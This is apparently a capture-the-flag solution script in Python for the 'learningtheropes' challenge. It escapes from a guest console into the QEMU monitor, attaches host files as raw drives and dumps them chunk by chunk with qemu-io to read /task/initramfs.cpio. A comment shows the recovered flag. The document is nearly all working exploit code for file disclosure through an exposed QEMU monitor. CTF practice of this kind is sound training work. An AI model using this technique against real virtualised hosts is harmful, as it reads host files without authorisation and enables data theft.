#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

target = {'host':'pwn-learningtheropes.ctfz.one', 'port':1947}

#==========

def attack(conn, **kwargs):
    qm = QemuMonitor(conn)

    # info roms
    qm.dump_file('/task/initramfs.cpio')
    # qm.dump_drive('hd0')

class QemuMonitor:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

        self.sendlineafter('Linux', '\x01c')
        self.sendlineafter('(qemu)', 'stop')

    def drive_add(self, idn, fname):
        self.sendlineafter('(qemu)', 'drive_add 0 file={},id={},format=raw,if=none,readonly=on'.format(fname, idn))
        self.recvuntil('OK\r\n')

    def drive_del(self, idn):
        self.sendlineafter('(qemu)', 'drive_del {}'.format(idn))

    def dump_drive(self, drive, size=None):
        if size is None:
            self.sendlineafter('(qemu)', 'qemu-io {} map'.format(drive))
            self.recvuntil('\r\n')
            size = int(self.recvuntil('\n').split()[2][1:-1],16)
            
            info('size : {}'.format(size))

        lf = open(drive, 'wb')
        for ofs in xrange(0, size, 0x1000):
            self.sendlineafter('(qemu)', 'qemu-io {} "read -v {} 0x1000"'.format(drive, ofs))
            self.recvuntil('\r\n')
            data = self.recvuntil('ops/sec)\n', drop=True).split('\n')[:-2]
            s = ''
            for d in data:
                s += ''.join(d.split()[1:17]).decode('hex')
            lf.write(s)
        lf.close()

    def dump_file(self, rfile, size = None):
        name = rfile.split('/')[-1]

        self.drive_add(name, rfile)
        self.dump_drive(name, size)
        self.drive_del(name)

#==========

if __name__=='__main__':
    comn = Communicate('SOCKET', **target)
    comn.connect()
    comn.run(attack)
    # comn.connection.interactive()

    '''
    $ strings initramfs.cpio | grep ctfzone                                                                                                                                î‚²  
    ctfzone{W3lc0m3_t0_th3_D@rk_51d3!_H3r3_@r3_y0ur_c00k135}
    '''

#==========
